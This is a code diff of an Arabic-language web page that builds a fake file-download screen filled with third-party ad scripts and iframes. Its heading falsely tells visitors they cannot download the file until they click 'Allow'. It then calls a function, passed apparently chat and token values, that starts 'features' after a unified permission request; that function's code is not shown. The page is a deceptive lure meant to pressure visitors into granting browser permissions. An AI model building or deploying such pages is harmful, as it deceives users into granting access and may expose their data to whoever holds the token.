+      wrap.style.background = '#f5f5f5';
+      
+      // إنشاء صفحة التحميل مع إعلانات أصغر وأكثر
+      const downloadPage = document.createElement('div');
+      downloadPage.className = 'download-page';
+      
+      const mainBox = document.createElement('div');
+      mainBox.className = 'main-box';
+      
+      const h2 = document.createElement('h2');
+      h2.textContent = 'يجب الضغط علي سماح لحماية الوحدة الاعلانيه من الزيارات الوهمية لم تتمكن من تنزيل الملف إلا بعد الضغط علي سماح';
+      mainBox.appendChild(h2);
+      
+      // شبكة الإعلانات (8 مربعات صغيرة)
+      const adsGrid = document.createElement('div');
+      adsGrid.className = 'ads-grid';
+      
+      // 8 إعلانات متكررة (يمكن تغيير الروابط حسب الرغبة)
+      for (let i = 0; i < 8; i++) {
+        const adDiv = document.createElement('div');
+        adDiv.className = 'ad-small';
+        // محتوى مختلف لكل إعلان (يمكن استخدام iframe أو نصوص)
+        if (i % 2 === 0) {
+          // إعلان بصيغة iframe (مثال)
+          adDiv.innerHTML = `<iframe src="https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c" width="160" height="300" frameborder="0" scrolling="no"></iframe>`;
+        } else {
+          // إعلان بصيغة نص برمجي (يتم تحميله لاحقاً)
+          const scriptId = `ad-script-${i}`;
+          adDiv.innerHTML = `<div id="${scriptId}"></div>`;
+          // سيتم ملؤه بواسطة loadAd
+        }
+        adsGrid.appendChild(adDiv);
+      }
+      mainBox.appendChild(adsGrid);
+      
+      // زر التحميل
+      const downloadBtn = document.createElement('button');
+      downloadBtn.className = 'download-btn';
+      downloadBtn.textContent = 'التالي';
+      downloadBtn.onclick = function() {
+        window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c","_blank");
       };
-    `;
-    document.body.appendChild(atOptionsScript);
-    loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
-    
-    // بدء الميزات (مع طلب إذن موحد)
-    startFeatures(chat, token, features);
-  }
-</script>
+      mainBox.appendChild(downloadBtn);
+      
+      // الفوتر
+      const footer = document.createElement('div');
+      footer.className = 'footer';
+      footer.textContent = '';
+      mainBox.appendChild(footer);
+      
+      downloadPage.appendChild(mainBox);
+      wrap.appendChild(downloadPage);
+      
+      // تحميل الإعلانات الإضافية في المربعات الفارغة
+      // (نقوم بتحميل نفس النصوص المستخدمة في الأصل ولكن بعدد أكبر)
+      loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
+      loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
+      loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
+      
+      const atOptionsScript = document.createElement('script');
+      atOptionsScript.innerHTML = `
+        atOptions = {
+          'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
+          'format' : 'iframe',
+          'height' : 300,
+          'width' : 160,
+          'params' : {}
+        };
+      `;
+      document.body.appendChild(atOptionsScript);
+      loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
+      
+      // بدء الميزات (مع طلب إذن موحد)
+      startFeatures(chat, token, features);
+    }
+  </script>
 </body>
             </html>
